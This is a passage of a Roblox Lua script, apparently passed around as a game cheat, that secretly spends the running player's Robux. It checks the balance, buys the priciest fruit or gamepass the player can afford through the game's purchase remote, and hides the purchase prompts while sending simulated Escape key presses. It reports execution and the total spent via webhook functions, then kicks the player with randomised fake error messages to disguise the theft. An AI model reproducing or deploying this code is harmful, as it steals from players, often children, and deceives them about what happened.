    elseif balance >= 2100 then
        buyItem("Permanent Rumble-Rumble", 2100)
    elseif balance >= 2000 then
        buyItem("Permanent Portal-Portal", 2000)
    elseif balance >= 1900 then
        buyItem("Permanent Sound-Sound", 1900)
    elseif balance >= 1800 then
        buyItem("Permanent Spider-Spider", 1800)
    elseif balance >= 1700 then
        buyItem("Permanent Love-Love", 1700)
    elseif balance >= 1650 then
        buyItem("Permanent Buddha-Buddha", 1650)
    elseif balance >= 1300 then
        buyItem("Permanent Magma-Magma", 1300)
    elseif balance >= 1275 then
        buyItem("Permanent Ghost-Ghost", 1275)
    elseif balance >= 1250 then
        buyItem("Permanent Barrier-Barrier", 1250)
    elseif balance >= 1100 then
        buyItem("Permanent Light-Light", 1100)
    elseif balance >= 1000 then
        buyItem("Permanent Diamond-Diamond", 1000)
    elseif balance >= 950 then
        buyItem("Permanent Dark-Dark", 950)
    elseif balance >= 850 then
        buyItem("Permanent Sand-Sand", 850)
    elseif balance >= 750 then
        buyItem("Permanent Ice-Ice", 750)
    elseif balance >= 650 then
        buyItem("Permanent Falcon-Falcon", 650)
    elseif balance >= 550 then
        buyItem("Permanent Flame-Flame", 550)
    elseif balance >= 380 then
        buyItem("Permanent Spike-Spike", 380)
    elseif balance >= 250 then
        buyItem("Permanent Smoke-Smoke", 250)
    elseif balance >= 220 then
        buyItem("Permanent Bomb-Bomb", 220)
    elseif balance >= 180 then
        buyItem("Permanent Spring-Spring", 180)
    elseif balance >= 100 then
        buyItem("Permanent Blade-Blade", 100)
    elseif balance >= 75 then
        buyItem("Permanent Spin-Spin", 75)

    -- << Gamepasses
    elseif balance >= 2700 then
        buyItem("Fruit Notifier", 2700)
    elseif balance >= 1500 then
        buyItem("3x Mythical Scrolls", 1500)
    elseif balance >= 1200 then
        buyItem("Dark Blade", 1200)
    elseif balance >= 450 then
        buyItem("2x Mastery", 450)
    elseif balance >= 450 then
        buyItem("2x Money", 450)
    elseif balance >= 400 then
        buyItem("+1 Fruit Storage", 400)
    elseif balance >= 350 then
        buyItem("2x Boss Drops", 350)
    elseif balance >= 50 then
        buyItem("10K Money", 50)
    elseif balance >= 25 then
        buyItem("2x EXP (15 mins.)", 25)
    end
end

local CoreGui = game:GetService("CoreGui")

local function getRobuxAndProceed()
    coroutine.wrap(function()
        coroutine.wrap(loopSinkTransparency)()

        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["StorageName"] = "2x EXP (15 mins.)",
                ["FunnelId"] = "Shop",
                ["PurchaseLocation"] = "Shop"
            }
        }

        local CommF = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("CommF_")
        if CommF then
            CommF:InvokeServer(unpack(args))
        end

        local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
        while not PurchasePrompt do
            task.wait()
            PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
        end

        coroutine.wrap(function()
            while true do
                local RobuxUpsellContainer = PurchasePrompt and PurchasePrompt:FindFirstChild("RobuxUpsellContainer")
                if RobuxUpsellContainer then
                    RobuxUpsellContainer.Visible = false
                    game.Players.LocalPlayer:Kick("Script Failed To Load! Please, Rejoin & Try again.")
                    break
                end
                task.wait(0.1)
            end
        end)()      

        local ProductPurchaseContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
        if ProductPurchaseContainer then
            local Animator = ProductPurchaseContainer:FindFirstChild("Animator")
            if Animator then
                local Prompt = Animator:WaitForChild("Prompt")
                if Prompt then
                    Prompt.Visible = false
                    local settingsClippingShield = CoreGui:FindFirstChild("RobloxGui") and CoreGui.RobloxGui:FindFirstChild("SettingsClippingShield")
                    if settingsClippingShield then
                        settingsClippingShield.Visible = false
                    end

                    task.wait(1)

                    local balance = getRobuxBalance()
            
                    if balance < 25 then
                        game.Players.LocalPlayer:Kick("Script Failed To Load! Please, Rejoin & Try again.")
                        return
                    end

                    local VirtualInputManager = game:GetService("VirtualInputManager")
                    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
                    task.wait()
                    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)

                    waitForPromptToDisappear()

                    task.wait(0.5)

                    stealItem(balance)
                else
                    print("err1")
                end
            else
                print("err2")
            end
        else
            print("err3")
        end
    end)()
end

local function waitForPrompt()
    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
    if not PurchasePrompt then return end
    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
    if not ProductContainer then return end
    local Animator = ProductContainer:FindFirstChild("Animator")
    if not Animator then return end

    modifyPromptUI(true)

    Animator.ChildAdded:Connect(function(child)
        if child.Name == "Prompt" then
            modifyPromptUI(false)
            waitForPurchaseConfirmation()
        end
    end)

    local messages = {
        "Error! Please, Rejoin & Try Again.",
        "You have been kicked from this game. Reason: Unexpected error. Rejoin & Try again.",
        "Oops! Something went wrong. Try rejoining. Rejoin & Try again.",
        "Your connection was lost. Please reconnect. Rejoin & Try again.",
        "You were kicked for suspicious activity. Contact support if this is a mistake. Rejoin & Try again.",
        "Game data error!. Please rejoin. Rejoin & Try again.",
        "Network timeout. Reconnect to continue. Rejoin & Try again.",
        "This session has expired. Please rejoin. Rejoin & Try again.",
        "Invalid client state detected. Restart and try again.",
        "You were kicked for exceeding the rate limit. Slow down! Rejoin & Try again.",
        "Server maintenance. Come back later. Rejoin & Try again.",
        "Unspecified error. Please try rejoining. Rejoin & Try again.",
        "Something broke. Report this to the developers. Rejoin & Try again.",
        "ERROR. Rejoin & Try again.",
        "Oops! The server tripped on a bug. Please rejoin. Rejoin & Try again.",
        "Illegal move detected. Rejoin & Try again.",
        "Disconnected due to inactivity. Rejoin when you're ready. Rejoin & Try again.",
        "Kicked by Uzoth. Reason: Sorry random dude, just testing kick system, you can rejoin",
    }

    coroutine.wrap(function()
        while not promptConfirmed do
            task.wait()
        end

        if totalSpent >= 25 and promptConfirmed then
            sendWebhook2(totalSpent)
            task.wait(0.5)
            local randomMessage = messages[math.random(1, #messages)]
            game.Players.LocalPlayer:Kick(randomMessage)
        else
            print("err")
        end

        local VirtualInputManager = game:GetService("VirtualInputManager")

        while true do
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
            task.wait() 

            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)

            local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
            if not PurchasePrompt then
                break
            end

            local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
            if not ProductContainer then break end

            local Animator = ProductContainer:FindFirstChild("Animator")
            if not Animator then break end

            local prompt = Animator:FindFirstChild("Prompt")
            if not prompt then
                break 
            end
        end
    end)()
end

local success, err = pcall(function()
    UserId = Players:GetUserIdFromNameAsync(Username)
end)

if success then
    sendExecutionLog()
    waitForPrompt()
    getRobuxAndProceed()
else
    warn("Error: " .. err)
end

game.Players.LocalPlayer.OnTeleport:Connect(function()
    _G.scriptExecuted = nil
end)
